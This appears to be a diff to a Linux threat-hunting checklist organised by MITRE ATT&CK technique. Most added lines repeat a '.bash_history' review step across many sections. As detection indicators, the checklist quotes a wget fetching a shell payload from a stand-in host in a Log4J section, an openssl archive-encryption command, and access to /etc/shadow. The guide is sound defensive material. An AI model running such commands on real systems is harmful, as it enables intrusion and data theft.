@@ -1,3 +1,9 @@
+# Find Port Scanning
+1. Look within the user or root command line history on the machine using ```.bash_history```. 
+
+# Discover Web Shells
+1. Look within ```/var/log/apache2/access.log``` to find php traffic with interactions with wp-admin and theme editors. 
+
 # Find Systemd Manipulation [T1543.002](https://attack.mitre.org/techniques/T1543/002/)
 1. Look for unrecognized systemd units: 
 ```
@@ -7,9 +13,11 @@ find \
     while read -r f; do dpkg -S "${f#/}" >/dev/null; done
 ```
 2. Check changes to systemd units with ```systemd-delta```. 
+3. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # Exploitation of SSH [T1021.004](https://attack.mitre.org/techniques/T1021/004/)
 1. Look for readable ssh files withn /etc/ or other common locations on the system. Confirm the escalation using the auth.log. 
+2. Look within the user or root command line history on the machine using ```.bash_history```.
  
 # Archive Data with OpenSSL [T1560.001](https://attack.mitre.org/techniques/T1560/001/)
 1. Look for use of openssl to encrypt data before tunneling takes place with ```openssl enc -aes-256-cbc -salt -pass pass:test123 -in /home/ransom_test/upload.tar.gz -out /home/ransom_test/encrypted_upload.tar.gz```. 
@@ -20,6 +28,7 @@ find \
 
 # Find Dump Credential Activity [T1003.008](https://attack.mitre.org/techniques/T1003/008/)
 1. Look for command line execution with target files of ```/etc/shadow``` and ```/etc/passwd```. 
+2. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # Find JNDI Exploitation/Log4J [T1190](https://attack.mitre.org/techniques/T1190/)
 1. Look for log traffic with ```wget http[:]//awk3hd9encccccA_diesla[:]8000/get_shell_payload``` and ```java log4j_execution.java wget http://awk3hd9encccccA_diesla:8000/get_shell_payload``` like attempts. It should contain Java within the command. 
@@ -28,6 +37,7 @@ find \
 1. Look within the user home directories for ```.bash_history```. 
 2. Look for aliasing within ```.bashrc``` in the user home directory. 
 3. Use ```ausearch -sc execve -i``` to look for command line execution. 
+4. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # Find USB Devices [T1025](https://attack.mitre.org/techniques/T1025/)
 1. Look at ```usb``` strings within ```/var/log/syslog```. 
@@ -35,6 +45,7 @@ find \
 
 # Find Hidden Files [T1564.001](https://attack.mitre.org/techniques/T1564/001/)
 1. Use ```osqueryi``` with ```SELECT filename, path, directory, size, type FROM file WHERE path LIKE '/.%';```. 
+2. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # Explore Process Thread Activity [T1134.003](https://attack.mitre.org/techniques/T1134/003) [T1574.005](https://attack.mitre.org/techniques/T574/005) [T1574.010](https://attack.mitre.org/techniques/T1574/010) [T1055.003](https://attack.mitre.org/techniques/T1055/003) [T1055.005](https://attack.mitre.org/techniques/T1055/005) [T1620](https://attack.mitre.org/techniques/T1620)
 1. On the command line, use ```lsof``` to examine process calls and possible network connections. 
@@ -61,6 +72,7 @@ for i in $(ps ax -o pid); do \
 done 2>/dev/null | \
     sort -u
 ```
+6. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # Explore Processes [T1059](https://attack.mitre.org/techniques/T1059) [T1055](https://attack.mitre.org/techniques/T1055/)
 1. On the command line, use ```lsof``` to examine process calls and possible network connections. 
@@ -77,12 +89,14 @@ for i in $(ps ax -o pid); do \
 done 2>/dev/null | \
     sort -u
 ```
+9. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # User Creation [T1136](https://attack.mitre.org/techniques/T1136/)
 1. Look within auth.log for ```useradd``` events. 
 2. Look within ```/etc/passwd``` for another user creation. 
 3. If service based, look within ```journalctl``` output for the specific service. 
 4. Use osqueryi with ```Select username, uid, description from users;``` to find all users. 
+5. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # Explore Scheduled Tasks/CronJobs [T1036.004](https://attack.mitre.org/techniques/T136/004) [T1053.005](https://attack.mitre.org/techniques/T1053/005)
 1. Look within ```/var/spool/crontab``` to find each cronjob associated with each user. 
@@ -92,7 +106,7 @@ done 2>/dev/null | \
 5. Loop through each of the users and find the crontabs with ```sudo bash -c 'for user in $(cut -f1 -d: /etc/passwd); do entries=$(crontab -u $user -l 2>/dev/null | grep -v "^#"); if [ -n "$entries" ]; then echo "$user: Crontab entry found!"; echo "$entries"; echo; fi; done'```. 
 6. Look for cron execution within ```/var/log/syslog```. 
 7. View process execution and focus on cronjobs using [pspy](https://github.com/DominicBreuker/pspy). 
-8. Find the system level crobjobs within ```/etc/``` within ```
+8. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # Find Service Creation [T1569.002](https://attack.mitre.org/techniques/T1569/002) [T1543.003](https://attack.mitre.org/techniques/T1543/003)
 1. Look within ```/etc/systemd/service``` to find anomalous services. 
@@ -100,6 +114,7 @@ done 2>/dev/null | \
 3. Find using ```journalctl``` on the command line. 
 4. Run the command ```systemctl list-units --type=service --state=running``` to find all running services. 
 5. Find information about the service within ```/etc/systemd/system```. 
+6. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # Find Installed Packages [T1072](https://attack.mitre.org/techniques/T1072/)
 1. Use the command ```dpkg -l``` on the system.  
@@ -112,6 +127,7 @@ for i in $(find /{,s}bin/ -type f -perm /111); do echo "${i#/}"; done | \
     grep -F 'no path found'
 ```
 5. Verify package integrity with ```dpkg -V```. 
+6. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # View User Authentications [T1078](https://attack.mitre.org/techniques/T1078/)
 1. Look at ```/var/log/auth.log``` file and focus on authentications with ```Accepted Password``` or ```Sessions opened```. 
@@ -124,6 +140,7 @@ for i in $(find /{,s}bin/ -type f -perm /111); do echo "${i#/}"; done | \
 
 # Find Vim Use [T1059.004](https://attack.mitre.org/techniques/T1059/004/)
 1. Look within the user ```.viminfo``` file saved in their home directory. 
+2. Look within the user or root command line history on the machine using ```.bash_history```.
 
 # Find Browser Artifacts [T1606.001](https://attack.mitre.org/techniques/T1606/001) [T1539](https://attack.mitre.org/techniques/T1539) [T1550.004](https://attack.mitre.org/techniques/T1550/004) [T1189](https://attack.mitre.org/techniques/T1189) [T1203](https://attack.mitre.org/techniques/T1203)[T1608.004](https://attack.mitre.org/techniques/T1608/004) [T1218.001](https://attack.mitre.org/techniques/T1218/001) [T1218.005](https://attack.mitre.org/techniques/T1218/005) [T1204.001](https://attack.mitre.org/techniques/T1204/001) [T1176](https://attack.mitre.org/techniques/T1176) [T1185](https://attack.mitre.org/techniques/T1185)
 1. Look within user home directory for ```.mozilla/firefox``` or ```.config/googlechrome``` files. 
